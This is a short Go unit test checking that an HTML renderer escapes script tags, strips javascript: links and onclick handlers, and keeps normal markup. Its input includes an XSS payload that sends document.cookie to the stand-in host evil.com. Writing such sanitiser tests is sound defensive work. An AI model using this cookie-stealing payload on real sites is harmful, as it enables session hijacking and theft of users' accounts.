package handler

import "strings"

import "testing"

func TestNeutralizeActiveHTML(t *testing.T) {
	in := `<pre><code><script>document.location='http://evil.com/?c='+document.cookie</script></code></pre>`
	out := string(RenderContent("html", in))
	if strings.Contains(out, "<script") {
		t.Fatalf("live <script> survived: %s", out)
	}
	if !strings.Contains(out, "&lt;script") {
		t.Fatalf("payload not shown as text: %s", out)
	}
	// event handler + javascript: neutralised
	out2 := string(RenderContent("html", `<a href="javascript:alert(1)">x</a><b onclick="evil()">y</b>`))
	if strings.Contains(strings.ToLower(out2), "javascript:") || strings.Contains(strings.ToLower(out2), "onclick=") {
		t.Fatalf("active attrs survived: %s", out2)
	}
	// normal formatting is preserved
	out3 := string(RenderContent("html", `<h1>Title</h1><pre><code>ls -la</code></pre>`))
	if !strings.Contains(out3, "<h1>Title</h1>") || !strings.Contains(out3, "ls -la") {
		t.Fatalf("legit HTML broken: %s", out3)
	}
}
